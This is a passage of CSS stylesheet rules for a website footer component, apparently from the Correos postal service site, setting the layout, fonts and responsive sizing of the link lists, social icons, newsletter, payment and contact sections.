			transition-property: opacity, transform;
			transition-property: opacity, transform, -webkit-transform
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__item.sc-correos-cdk-core-footer {
			padding-bottom: 20px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__item.sc-correos-cdk-core-footer:last-child {
			padding-bottom: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__item--padding-bottom.sc-correos-cdk-core-footer {
			padding-bottom: 20px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__item--padding-bottom.sc-correos-cdk-core-footer:last-child {
			padding-bottom: 20px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__title.sc-correos-cdk-core-footer {
			font-size: 1.125rem;
			line-height: 1.625rem;
			color: var(--_cdk-core-footer-color-font-dark);
			font-weight: 300;
			display: block;
			width: 100%;
			padding-bottom: 26px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__title.sc-correos-cdk-core-footer {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer {
			color: var(--_cdk-core-footer-color-font-dark);
			display: inline-block;
			font-size: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer {
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_cdk-core-footer-icon-color);
			text-decoration: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer:hover {
			text-decoration: underline
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
			display: grid;
			-ms-flex-pack: center;
			justify-content: center;
			-ms-flex-align: center;
			align-items: center
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
				grid-template-columns: auto auto
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
				grid-template-columns: 1fr 1fr
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
				grid-template-columns: 1fr 1fr
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
			height: 56px;
			width: 100%;
			background-color: var(--_cdk-core-footer-color-rectangle);
			-webkit-box-shadow: 0 -2px 6px 0 rgba(0, 0, 0, 0.05);
			box-shadow: 0 -2px 6px 0 rgba(0, 0, 0, 0.05)
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
				padding-left: 24px;
				padding-right: 24px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
				padding-left: 64px;
				padding-right: 64px
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
			height: 32px;
			color: var(--_cdk-core-footer-color-left-links);
			font-weight: bold;
			letter-spacing: 0;
			text-decoration: none;
			min-width: 140px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
				font-size: 14px;
				border-right: 1px solid #002e6d
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
				font-size: 16px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
				font-size: 16px
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			height: 32px;
			width: 1px
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
				margin-left: 10px;
				border: 1px solid #002e6d
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
				margin-left: 16px;
				border: 1px solid transparent
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
				margin-left: 16px;
				border: 1px solid transparent
			}
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: end;
				justify-content: flex-end
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: start;
				justify-content: flex-start
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: start;
				justify-content: flex-start
			}
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: start;
				justify-content: flex-start
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: end;
				justify-content: flex-end
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: end;
				justify-content: flex-end
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-social.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			width: 100%;
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none
		}

		.sc-correos-cdk-core-footer-h .cdk-social__item.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 auto;
			flex: 0 1 auto;
			margin-right: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-social__item.sc-correos-cdk-core-footer:last-child {
			margin-right: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-social__lnk.sc-correos-cdk-core-footer {
			color: var(--_cdk-core-footer-icon-color);
			text-decoration: none;
			font-size: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer {
			padding: 40px 0;
			padding-bottom: 32px;
			display: -ms-flexbox;
			display: flex;
			width: 100%;
			-ms-flex-align: start;
			align-items: flex-start;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer {
			padding: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-title.sc-correos-cdk-core-footer {
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_cdk-core-footer-color-font-dark);
			font-weight: 300;
			display: block;
			width: 100%;
			padding-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-title.sc-correos-cdk-core-footer {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 100%;
			flex: 0 1 100%;
			margin-bottom: 8px
		}

		.sc-correos-cdk-core-footer-h .cdk-app-list__list.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-app-list__item.sc-correos-cdk-core-footer {
			margin-right: 16px;
			margin-bottom: 16px
		}

		.sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 100%;
			flex: 0 1 100%;
			margin-bottom: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-pay-list__list.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-pay-list__container-img.sc-correos-cdk-core-footer {
			width: 56px;
			height: 32px;
			border: 0.25px solid var(--_cdk-core-footer-border-color);
			background: var(--_cdk-core-footer-color-font);
			border-radius: 4px;
			margin-right: 16px;
			-webkit-box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
			box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1)
		}

		.sc-correos-cdk-core-footer-h .cdk-pay-list__container-img.sc-correos-cdk-core-footer:last-child {
			margin-right: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 100%;
			flex: 0 1 100%
		}

		.sc-correos-cdk-core-footer-h .cdk-certificate-list__list.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-certificate-list__container-img.sc-correos-cdk-core-footer {
			width: 43px;
			height: 20px;
			margin-right: 15px
		}

		.sc-correos-cdk-core-footer-h .cdk-certificate-list__container-img.sc-correos-cdk-core-footer:last-child {
			margin-right: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
			background-color: var(--_cdk-core-footer-background-color-lite);
			padding: 24px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: start;
			align-items: flex-start;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer {
			width: 40px;
			height: 40px
		}

		.sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
			width: 100%
		}

		.sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
			-webkit-margin-before: 0;
			margin-block-start: 0;
			-webkit-margin-after: 0;
			margin-block-end: 0;
			margin: 0;
			padding: 0;
			list-style: none;
			display: -ms-flexbox;
			display: flex;
			width: 100%;
			-ms-flex-direction: column;
			flex-direction: column;
			padding-top: 24px
		}

		.sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
			padding-bottom: 16px
		}

		.sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
			padding-bottom: 0
		}

		.sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
			font-size: 12px;
			line-height: 18px;
			color: var(--_cdk-core-footer-color-font);
			font-weight: 300;
			text-decoration: none
		}

		.sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer:hover {
			text-decoration: underline
		}

		.sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.75rem;
			line-height: 1.175rem;
			color: var(--_cdk-core-footer-border-color);
			display: block;
			width: 100%;
			margin-top: 24px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
				font-size: 0.875rem;
				line-height: 1.25rem
			}
		}

		.sc-correos-cdk-core-footer-h .--padding.sc-correos-cdk-core-footer {
			padding: 0 8px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
			padding: 48px 0 40px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
			-ms-flex-direction: column;
			flex-direction: column;
			-ms-flex: 0 1 70%;
			flex: 0 1 70%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 70%;
			flex: 0 1 70%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
			margin-left: 24px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
			display: block;
			width: 100%;
			padding-top: 85px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
			padding-top: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer {
			-ms-flex-wrap: nowrap;
			flex-wrap: nowrap;
			border-bottom: 1px solid var(--_cdk-core-footer-border-color);
			padding-bottom: 48px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 calc(100% / 4 - 10px);
			flex: 0 1 calc(100% / 4 - 10px);
			margin-right: 10px;
			border-bottom: 0;
			padding: 0 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child {
			margin-right: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer {
			padding: 0;
			border-bottom: 0;
			margin-bottom: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer {
			padding-top: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer {
			display: block;
			width: 100%;
			margin-bottom: 26px;
			font-size: 34px;
			height: 36px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer {
			padding: 40px 0;
			padding-bottom: 40px;
			-ms-flex-wrap: nowrap;
			flex-wrap: nowrap
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer {
			padding: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
		[size=md].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
			margin-right: 10px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 calc(40% - 10px);
			flex: 0 1 calc(40% - 10px);
			margin-bottom: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 calc(35% - 10px);
			flex: 0 1 calc(35% - 10px);
			margin-bottom: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 25%;
			flex: 0 1 25%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
			padding: 24px;
			-ms-flex-wrap: nowrap;
			flex-wrap: nowrap
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
			width: calc(100% - 48px);
			padding-left: 40px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer {
			width: 48px;
			height: 48px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
			-ms-flex-direction: row;
			flex-direction: row;
			padding-top: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
			font-size: 16px;
			line-height: 24px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
			margin-right: 48px;
			padding-bottom: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
			margin-right: 0;
			padding-bottom: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer,
		[size=lg].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
			margin-top: 10px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
			padding: 24px 0 40px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			width: 200px;
			height: 200px;
			-ms-flex: 0 1 20%;
			flex: 0 1 20%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 90%;
			flex: 0 1 90%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
			margin: 0 24px;
			margin-top: 16px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 50%;
			flex: 0 1 50%;
			margin: 0 24px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 40%;
			flex: 0 1 40%
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: start;
			justify-content: flex-start;
			margin-left: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
			padding: 40px 16px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
			padding-top: 40px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
			padding-top: 0
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
			font-size: 14px;
			line-height: 24px
		}

		[size=md].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
			margin-right: 32px
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
			padding: 40px 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
			-ms-flex-direction: column;
			flex-direction: column
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 50%;
			flex: 0 1 50%;
			margin-right: 32px;
			margin-bottom: 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 50%;
			flex: 0 1 50%
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			margin-top: 24px;
			-ms-flex-pack: start;
			justify-content: flex-start
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-footer-container__isNewsletter.sc-correos-cdk-core-footer {
			padding-bottom: 40px
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
			padding-top: 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
			padding: 16px 24px;
			-ms-flex-wrap: nowrap;
			flex-wrap: nowrap
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
			width: calc(100% - 40px);
			padding-left: 24px
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
			-ms-flex-direction: row;
			flex-direction: row;
			padding-top: 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
			font-size: 12px;
			line-height: 18px
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
			margin-right: 16px;
			padding-bottom: 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
			margin-right: 0;
			padding-bottom: 0
		}

		[size=sm].sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
			margin-top: 10px
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
			padding: 48px 0 40px
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
			display: -ms-flexbox;
			display: flex;
			width: 200px;
			height: 200px;
			-ms-flex: 0 1 18%;
			flex: 0 1 18%
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 80%;
			flex: 0 1 80%
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
			margin: 16px 32px 0 55px
		}

		[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
			-ms-flex: 0 1 50%;
